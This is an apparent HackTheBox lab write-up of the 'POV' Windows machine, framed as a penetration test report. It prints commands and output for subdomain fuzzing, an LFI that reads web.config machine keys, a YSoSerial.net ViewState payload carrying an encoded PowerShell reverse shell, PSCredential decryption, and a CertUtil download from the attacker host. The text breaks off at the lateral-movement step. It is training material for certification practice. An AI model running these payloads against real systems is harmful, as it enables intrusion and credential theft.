+++
title = "POV-CPTS-Prep-Box-Writeup.md"
date = 2026-02-19T00:00:00Z
draft = false
description = "POV is a medium-difficulty Windows machine featuring subdomain enumeration, LFI in an ASP.NET application, ViewState deserialization RCE, credential extraction from PowerShell credentials, and SeDebugPrivilege abuse for SYSTEM compromise"
tags = ["CPTS", "HTB", "POV", "CPTS Prep", "Windows", "ASP.NET", "ViewState", "Deserialization", "SeDebugPrivilege"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows host "POV" (`10.129.33.174`). The objective was to evaluate the security posture of the target and identify potential escalation paths to achieve SYSTEM-level privileges.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to full system compromise. The following key findings were identified:

- **Subdomain Discovery:** Initial enumeration of the main website revealed a subdomain `dev.pov.htb` hosting a development portal with a CV download functionality.

- **Local File Inclusion (LFI):** The download functionality was vulnerable to LFI, allowing arbitrary file reads. This was leveraged to extract the `web.config` file containing ASP.NET machine keys.

- **ViewState Deserialization RCE:** The leaked machine keys were used with YSoSerial.net to generate a malicious ViewState payload, achieving remote code execution as the user `sfitz`.

- **Credential Extraction:** A PowerShell credential file (`connection.xml`) was discovered in the user's Documents folder, which contained encrypted credentials for the user `alaading`. These were decrypted to reveal the password.

- **SeDebugPrivilege Abuse:** The user `alaading` possessed SeDebugPrivilege, which was abused to migrate into the `winlogon.exe` process running as SYSTEM, achieving full system compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the target system. An attacker with no prior access was able to achieve SYSTEM-level privileges by chaining together multiple vulnerabilities including subdomain enumeration, LFI, ViewState deserialization, and privilege escalation via SeDebugPrivilege.

**Recommendations:**

- **Secure Machine Keys:** ASP.NET machine keys should be treated as highly sensitive secrets and never exposed. Rotate keys regularly and store them securely.
- **Input Validation:** Implement proper input validation to prevent LFI vulnerabilities in file download functionality.
- **Secure Credential Storage:** Avoid storing encrypted credentials on disk, especially with weak protection mechanisms.
- **Principle of Least Privilege:** Users should not have SeDebugPrivilege unless absolutely necessary. Review and restrict high-privilege assignments.

## About

POV is a medium-difficulty Windows machine that starts with a webpage featuring a business site. Enumerating the initial webpage, an attacker is able to find the subdomain `dev.pov.htb`. Navigating to the newly discovered subdomain, a `download` option is vulnerable to remote file read, giving an attacker the means to get valuable information from the `web.config` file. The subdomain uses the `ViewState` mechanism, which, in combination with the secrets leaked from the `web.config` file, is vulnerable to insecure deserialization, leading to remote code execution as the user `sfitz`. Looking at the remote filesystem, an attacker can discover and manipulate a file that reveals the credentials for the user `alaading`. Once the attacker has code execution as the user `alaading`, the `SeDebugPrivilege` is abused to gain code execution in the context of a privileged application, ultimately resulting in code execution as `nt authority\system`.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash
nmap -p- --min-rate 10000 10.129.33.174
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-03 12:50 EDT
Nmap scan report for 10.10.11.251
Host is up (0.093s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
nmap -p 80 -sCV 10.129.33.174
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-03 12:50 EDT
Nmap scan report for 10.10.11.251
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```

**Findings:** The scan revealed only port 80 open, running Microsoft IIS 10.0. The HTTP title confirmed the domain `pov.htb`.


**2. Subdomain Discovery**  
Directory and subdomain enumeration was performed to identify additional attack surfaces.

```bash
# Subdomain discovery

❯ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.33.174 -H "Host: FUZZ.pov.htb" -fw 3740

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.33.174
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3740
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 440ms]

```

**Findings:** The subdomain `dev.pov.htb` was discovered, redirecting to a development portal.

### Phase 2: Web Application Enumeration

**3. Directory Busting**  
Further enumeration was performed on the discovered subdomain to identify accessible directories and files.

```bash
# Diretory busting 

❯ feroxbuster --url http://dev.pov.htb/

───────────────────────────────────────────────────────────────────────────

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.pov.htb/
 🚩  In-Scope Url          │ dev.pov.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c http://dev.pov.htb/text/
404      GET       29l       95w     1245c http://dev.pov.htb/text/css
404      GET       29l       95w     1245c http://dev.pov.htb/bin
404      GET       29l       95w     1245c http://dev.pov.htb/App_Code
404      GET       29l       95w     1245c http://dev.pov.htb/App_Data
404      GET       29l       95w     1245c http://dev.pov.htb/Bin
404      GET       29l       95w     1245c http://dev.pov.htb/App_Browsers
404      GET       29l       95w     1245c http://dev.pov.htb/app_code
404      GET       29l       95w     1245c http://dev.pov.htb/app_data
404      GET       29l       95w     1245c http://dev.pov.htb/app_browsers
404      GET       29l       95w     1245c http://dev.pov.htb/App_code
404      GET       29l       95w     1245c http://dev.pov.htb/portfolio/Style%20Library
302      GET        2l       11w      165c http://dev.pov.htb/Style%20Library => http://dev.pov.htb/portfolio/Style Library
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       38l      258w    20768c http://dev.pov.htb/portfolio/assets/imgs/folio-3.jpg
200      GET      106l      271w     4691c http://dev.pov.htb/portfolio/contact.aspx
200      GET       99l      213w     4446c http://dev.pov.htb/portfolio/assets/imgs/logo.svg
200      GET      105l      502w    40401c http://dev.pov.htb/portfolio/assets/imgs/avatar-1.jpg
200      GET      126l      692w    55960c http://dev.pov.htb/portfolio/assets/imgs/blog-3.jpg
200      GET       52l      394w    33816c http://dev.pov.htb/portfolio/assets/imgs/folio-6.jpg
200      GET     1400l     5782w   280364c http://dev.pov.htb/portfolio/assets/vendors/jquery/jquery-3.4.1.js
200      GET     2130l     4224w   242029c http://dev.pov.htb/portfolio/assets/css/steller.css
200      GET      130l      819w    51761c http://dev.pov.htb/portfolio/assets/imgs/folio-2.jpg
200      GET      848l     2282w    48394c http://dev.pov.htb/portfolio/assets/imgs/man.svg
200      GET       57l      100w    16450c http://dev.pov.htb/portfolio/assets/vendors/themify-icons/css/themify-icons.css
200      GET        4l       44w    72801c http://dev.pov.htb/portfolio/assets/imgs/folio-4.jpg
200      GET      423l     1217w    21359c http://dev.pov.htb/portfolio/
404      GET       25l       91w     1245c http://dev.pov.htb/portfolio/logs
404      GET       25l       91w     1245c http://dev.pov.htb/portfolio/assets/secure
302      GET        3l        8w      149c http://dev.pov.htb/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/jquery => http://dev.pov.htb/portfolio/assets/vendors/jquery/
200      GET      423l     1217w    21371c http://dev.pov.htb/portfolio/default.aspx
302      GET        3l        8w      159c http://dev.pov.htb/portfolio/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/con
302      GET        3l        8w      175c http://dev.pov.htb/portfolio/assets/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/default.aspx
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/assets/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/con
302      GET        3l        8w      178c http://dev.pov.htb/portfolio/assets/js/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/default.aspx
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/js/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/con
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/jQuery => http://dev.pov.htb/portfolio/assets/vendors/jQuery/
302      GET        3l        8w      179c http://dev.pov.htb/portfolio/assets/css/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/default.aspx
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/css/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/con
302      GET        3l        8w      149c http://dev.pov.htb/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/aux
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/assets/vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/vendors/con => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/con
301      GET        2l       10w      164c http://dev.pov.htb/portfolio/assets/Imgs => http://dev.pov.htb/portfolio/assets/Imgs/
302      GET        3l        8w      159c http://dev.pov.htb/portfolio/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/aux
404      GET       25l       91w     1245c http://dev.pov.htb/portfolio/pluck
302      GET        2l       11w      163c http://dev.pov.htb/Donate%20Cash => http://dev.pov.htb/portfolio/Donate Cash
[#######>------------] - 17m    79903/210058  23m     found:50      errors:5452
[##########>---------] - 31m   129189/240061  33m     found:53      errors:48682
[###############>----] - 31m    22973/30000   12/s    http://dev.pov.htb/
[############>-------] - 30m    19150/30000   11/s    http://dev.pov.htb/portfolio/
[############>-------] - 29m    18934/30000   11/s    http://dev.pov.htb/portfolio/assets/
[############>-------] - 29m    18818/30000   11/s    http://dev.pov.htb/portfolio/assets/js/
[############>-------] - 29m    18766/30000   11/s    http://dev.pov.htb/portfolio/assets/css/
[###########>--------] - 26m    17291/30000   11/s    http://dev.pov.htb/portfolio/assets/vendors/
[#####>--------------] - 16m     7608/30000   8/s     http://dev.pov.htb/portfolio/assets/Imgs/
[###>----------------] - 13m     5500/30000   7/s     http://dev.pov.htb/portfolio/assets/Vendors/


301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/Vendors/Jquery => http://dev.pov.htb/portfolio/assets/Vendors/Jquery/
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log
302      GET        3l        8w      180c http://dev.pov.htb/portfolio/assets/Imgs/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/default.aspx
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/Imgs/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/prn
302      GET        3l        8w      183c http://dev.pov.htb/portfolio/assets/Vendors/default.aspx => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/default.aspx
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/Vendors/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/prn
[####################] - 62m   240067/240067  0s      found:60      errors:134051
[####################] - 48m    30000/30000   11/s    http://dev.pov.htb/ #
```

**Findings:** The scan revealed a portfolio site with a CV download functionality.


**4. LFI Vulnerability Discovery**  
The download functionality was tested for Local File Inclusion by manipulating the `file` parameter in the POST request.
```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 360
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ICSdoflT8WpXFeZu7aA5O7tR4Zxriow6TAaDbc0%2Fhu3hTOmlNu5xD2Flrpa%2FKJ0pWr17owRZZy9MKoMrk9X%2BgVIjCTc%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=2czryY00Lc6sdpJCs63DGhH6BVw8qP1lEkjbbjK1w6fsSXZpTrfvaIYoXImdcty2ZKWAnGkNWetjwAl3H82jWcmekLVRj1rNZjg8tkRi6UAwl%2Faq72k4d7bsirQXVFyvewn4rQ%3D%3D&file=/etc/passwd
```


```bash
❯ ffuf -request cv_download_req.txt -request-proto http  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -fs 168

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://dev.pov.htb/portfolio/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 :: Header           : Host: dev.pov.htb
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Cache-Control: max-age=0
 :: Header           : Origin: http://dev.pov.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
 :: Header           : Referer: http://dev.pov.htb/portfolio/
 :: Data             : __EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ICSdoflT8WpXFeZu7aA5O7tR4Zxriow6TAaDbc0%2Fhu3hTOmlNu5xD2Flrpa%2FKJ0pWr17owRZZy9MKoMrk9X%2BgVIjCTc%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=2czryY00Lc6sdpJCs63DGhH6BVw8qP1lEkjbbjK1w6fsSXZpTrfvaIYoXImdcty2ZKWAnGkNWetjwAl3H82jWcmekLVRj1rNZjg8tkRi6UAwl%2Faq72k4d7bsirQXVFyvewn4rQ%3D%3D&file=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 168
________________________________________________

:: Progress: [235/235] :: Job [1/1] :: 13 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

 /home/honeypoop/HTB/CPTS-Prep                      
```

**Findings:** The application was vulnerable to LFI, allowing reading of arbitrary files from the Windows filesystem.


### Phase 3: Sensitive File Extraction

**5. Hosts File Verification**  
The LFI was first tested by reading the Windows hosts file to verify the vulnerability and confirm subdomain configuration.

```bash
❯ curl -i -s -k -X 'POST' \
  -H 'Host: dev.pov.htb' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ICSdoflT8WpXFeZu7aA5O7tR4Zxriow6TAaDbc0%2Fhu3hTOmlNu5xD2Flrpa%2FKJ0pWr17owRZZy9MKoMrk9X%2BgVIjCTc%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=2czryY00Lc6sdpJCs63DGhH6BVw8qP1lEkjbbjK1w6fsSXZpTrfvaIYoXImdcty2ZKWAnGkNWetjwAl3H82jWcmekLVRj1rNZjg8tkRi6UAwl%2Faq72k4d7bsirQXVFyvewn4rQ%3D%3D&file=C:\Windows\System32\drivers\etc\hosts' \
  http://dev.pov.htb/portfolio/

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\Windows\System32\drivers\etc\hosts
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 18 Nov 2025 15:42:51 GMT
Content-Length: 857

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
127.0.0.1   pov.htb dev.pov.htb

 /home/honeypoop/HTB/CPTS-Prep   
 
```

**Findings:** The hosts file confirmed the subdomain configuration with `127.0.0.1 pov.htb dev.pov.htb`.


**6. Web.config Extraction**  
The LFI was used to read the `web.config` file, which often contains sensitive [ASP.NET](https://ASP.NET) configuration including machine keys.
```bash
❯ curl -i -s -k -X 'POST' -H 'Host: dev.pov.htb' -H 'Content-Type: application/x-www-form-urlencoded'   --data '__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ICSdoflT8WpXFeZu7aA5O7tR4Zxriow6TAaDbc0%2Fhu3hTOmlNu5xD2Flrpa%2FKJ0pWr17owRZZy9MKoMrk9X%2BgVIjCTc%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=2czryY00Lc6sdpJCs63DGhH6BVw8qP1lEkjbbjK1w6fsSXZpTrfvaIYoXImdcty2ZKWAnGkNWetjwAl3H82jWcmekLVRj1rNZjg8tkRi6UAwl%2Faq72k4d7bsirQXVFyvewn4rQ%3D%3D&file=C:\inetpub\wwwroot\dev\web.config' http://dev.pov.htb/portfolio/

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 18 Nov 2025 16:01:01 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="<REDACTED>" validation="SHA1" validationKey="<REDACTED>" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>      
```

**Findings:** The `web.config` file contained [ASP.NET](https://ASP.NET) machine keys:

- **decryptionKey:** `74477CEB<REDACTED>B43`
    
- **validationKey:** `5620D3<REDACTED>33468`

### Phase 4: ViewState Deserialization RCE

**7. [YSoSerial.net](https://YSoSerial.net) Payload Generation**  
The leaked machine keys were used with [YSoSerial.net](https://YSoSerial.net) to generate a malicious ViewState payload that would execute a reverse shell.

```powershell
.\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="<REDACTED>" --validationalg="SHA1" --validationkey="<REDACTED>" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
<REDACTED>
ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

On updating  `__VIEWSTATE` and submitting the request, there’s a shell at `nc`:

```powershell 

 .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="<REDACTED>" --validationalg="SHA1" --validationkey="<REDACTED>" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO<REDACTED>ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
a%2FoG%2BoK91mn5NRMFWzZkqVMmqY5VLsYGeA4GQ72tPh3YwS%2BCx1zwbr%2Fea01sOxG%2B%2F6IuWJpusMqfDqWolj1cAPoJkmTp4a%2FgBzSPF8Wu5%2Fhb4JDVMCkAnkny%2BTxPv7zqT0RIy7<REDACTED>yteYVI16jLIaMZHYUHrMzbM1wq47ETi1e4dfx7jpemoo7C4ciXjCuHiw5weLO2GW%2Ft7WMXWYwiameIz%2FUUvx5OgLx63cn0kOWUHyjgHggL%2B3XcugvqRB4HlZ2cCNW8GXyvkqvn%2FwJWdGb%2FWq0ZZWRg8dg%2BPA%3D%3D
```


**8. Reverse Shell Execution**  
The generated ViewState payload was submitted in a POST request to the vulnerable endpoint while a netcat listener was running.

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 4771
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=a%2FoG%2BoK91mn5NRMFWzZkqVMmqY5VLsYGeA4GQ72tPh3YwS%2BCx1zwbr%2Fea01sOxG%2B%2F6IuWJpusMqfDqWolj1cAPoJ<REDACTED>mrBZC7zUm12%2FPhrN8hP%2FJ9jcMnYebXg6uwIMWIcaiWv%2B4lyteYVI16jLIaMZHYUHrMzbM1wq47ETi1e4dfx7jpemoo7C4ciXjCuHiw5weLO2GW%2Ft7WMXWYwiameIz%2FUUvx5OgLx63cn0kOWUHyjgHggL%2B3XcugvqRB4HlZ2cCNW8GXyvkqvn%2FwJWdGb%2FWq0ZZWRg8dg%2BPA%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=6soHhsXgYXG6vePByQ3MvHRTrKic65YxPVQRl9JbQsPEGDcounsk3V3N8tmcvFgH%2FLTrWZ4pn5EwL2G%2FXX%2BgdN3QX%2FFWjpdS85mOKsQKczwMyMJqDCsWgoXChc4RJmt%2FC%2BqTcg%3D%3D&file=cv.pdf
```

**9. Shell as sfitz**  
The reverse shell connected back, providing access as the user `sfitz`.
```bash
❯ nc -nvlp 9001
Listening on 0.0.0.0 9001

Connection received on 10.129.24.111 49672
PS C:\windows\system32\inetsrv>
```


```powershell 
PS C:\windows\system32\inetsrv> tree . /F
Folder PATH listing
Volume serial number is 000002A2 0899:6CAF
C:\WINDOWS\SYSTEM32\INETSRV
?   appcmd.exe
?   appcmd.xml
?   AppHostNavigators.dll
?   apphostsvc.dll
?   appobj.dll
?   aspnetca.exe
?   authanon.dll
?   authbas.dll
?   cachfile.dll
?   cachhttp.dll
?   cachtokn.dll
?   cachuri.dll
?   compstat.dll
?   custerr.dll
?   defdoc.dll
?   dirlist.dll
?   filter.dll
?   gzip.dll
?   httpmib.dll
?   hwebcore.dll
?   iis.msc
?   iiscore.dll
?   iisreg.dll
?   iisres.dll
?   iisrstas.exe
?   iissetup.exe
?   iissyspr.dll
?   iisual.exe
?   iisutil.dll
?   iisw3adm.dll
?   InetMgr.exe
?   isapi.dll
?   loghttp.dll
?   Microsoft.Web.Administration.dll
?   Microsoft.Web.Management.dll
?   modrqflt.dll
?   nativerd.dll
?   protsup.dll
?   redirect.dll
?   rsca.dll
?   rscaext.dll
?   static.dll
?   uihelper.dll
?   validcfg.dll
?   w3ctrlps.dll
?   w3ctrs.dll
?   w3dt.dll
?   w3logsvc.dll
?   w3tp.dll
?   w3wp.exe
?   w3wphost.dll
?   wbhstipm.dll
?   wbhst_pm.dll
?   XPath.dll
?
????Config
????en
?       iisual.resources.dll
?
????en-US
        appcmd.exe.mui
        AppHostNavigators.dll.mui
        appobj.dll.mui
        iis.msc
        iisres.dll.mui
        iissetup.exe.mui
        Inetmgr.exe.mui
        uihelper.dll.mui
        XPath.dll.mui

PS C:\windows\system32\inetsrv>

```

### Phase 5: Post-Exploitation and Lateral Movement

**10. Initial Enumeration**  
The filesystem was explored to understand the user context and locate any interesting files.

```Powershell 

PS C:\Users\sfitz> ls


    Directory: C:\Users\sfitz


Mode                LastWriteTime         Length Name                         
----                -------------         ------ ----                         
d-r---       10/26/2023   5:02 PM                3D Objects                   
d-r---       10/26/2023   5:02 PM                Contacts                     
d-r---        1/11/2024   6:43 AM                Desktop                      
d-r---       12/25/2023   2:35 PM                Documents                    
d-r---       10/26/2023   5:02 PM                Downloads                    
d-r---       10/26/2023   5:02 PM                Favorites                    
d-r---       10/26/2023   5:02 PM                Links                        
d-r---       10/26/2023   5:02 PM                Music                        
d-r---       10/26/2023   5:02 PM                Pictures                     
d-r---       10/26/2023   5:02 PM                Saved Games                  
d-r---       10/26/2023   5:02 PM                Searches                     
d-r---       10/26/2023   5:02 PM                Videos                       


PS C:\Users\sfitz> cd Desktop
PS C:\Users\sfitz\Desktop> ls
PS C:\Users\sfitz\Desktop> cd ..
PS C:\Users\sfitz> tree . /F
Folder PATH listing
Volume serial number is 0899-6CAF
C:\USERS\SFITZ
????3D Objects
????Contacts
????Desktop
????Documents
?       connection.xml
?
????Downloads
????Favorites
?   ?   Bing.url
?   ?
?   ????Links
????Links
?       Desktop.lnk
?       Downloads.lnk
?
????Music
????Pictures
????Saved Games
????Searches
????Videos
PS C:\Users\sfitz>

```

**11. Credential Discovery**  
A PowerShell credential file was discovered in the Documents folder.
`connection.xml`
```bash PS C:\Users\sfitz\Documents> cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c292941<REDACTED> b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
PS C:\Users\sfitz\Documents>

```
**Findings:** The `connection.xml` file contained an encrypted PSCredential object for the user `alaading`.


**12. Credential Decryption**  
The encrypted credential was decrypted using PowerShell to reveal the plaintext password.

```powershell 
</Objs>
PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
f8g<REDACTED>
PS C:\Users\sfitz\Documents>
```
**Findings:** The password for user `alaading` was revealed: `f8g<REDACTED>`.


### Phase 6: Privilege Escalation to SYSTEM

**13. RunasCs Transfer**  
The RunasCs tool was downloaded to the target to execute commands as the newly discovered user.
```bash 
PS C:\users\sfitz\DOcuments> cd c:\programdata
PS C:\programdata>  CertUtil -URLCache -split -f http://10.10.16.25/RunasCs.exe RunasCs.exe

****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.
PS C:\programdata> PS C:\programdata> ls


    Directory: C:\programdata


Mode                LastWriteTime         Length Name                                 
----                -------------         ------ ----                                 
d---s-       10/26/2023   2:01 PM                Microsoft                            
d-----       10/26/2023   2:04 PM                Package Cache                        
d-----       10/26/2023   3:07 PM                regid.1991-06.com.microsoft          
d-----        9/15/2018  12:19 AM                SoftwareDistribution                 
d-----        11/5/2022  12:03 PM                ssh                                  
d-----        9/15/2018  12:19 AM                USOPrivate                           
d-----        11/5/2022  12:03 PM                USOShared                            
d-----       10/26/2023   2:04 PM                VMware                               
-a----       11/19/2025   3:57 AM          51712 RunasCs.exe                          
PS C:\programdata>

```

**14. Lateral Movement to alaading**  
